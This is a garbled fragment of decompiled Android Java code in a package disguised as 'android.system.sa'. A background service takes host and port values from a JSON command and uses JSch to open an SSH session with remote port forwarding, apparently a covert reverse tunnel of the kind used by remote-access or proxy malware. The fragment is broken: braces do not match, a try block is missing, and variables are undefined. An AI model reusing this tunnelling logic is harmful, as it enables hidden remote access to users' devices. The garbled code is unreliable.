package android.system.sa;
public class PortForwardingR {
    public static void a(final Service service, JSONObject jSONObject) throws JSONException, JSchException, NumberFormatException {
        final int iIntValue = Integer.valueOf(a.getString("rport")).intValue();
        Logger9.a("jsch.getSession");
        b = jSch.getSession(string3, string2, Integer.valueOf(a.getString("port")).intValue());
        new Thread(new Runnable() { // from class: android.system.sa.c.1
            public void run() throws InterruptedException, IOException {
                            PortForwardingR.b.setPortForwardingR(iIntValue, string, iIntValue2);
                            Logger9.a("connected");
                        } catch (Exception e) {
                            Logger9.a(e.toString());
                            YM.a(service, "exit", e.toString());
                            service.stopSelf();
                        } catch (InterruptedException e2) {
                    }
                }
                if (PortForwardingR.b != null) {
                    PortForwardingR.b.disconnect();
        }).start();
    }
}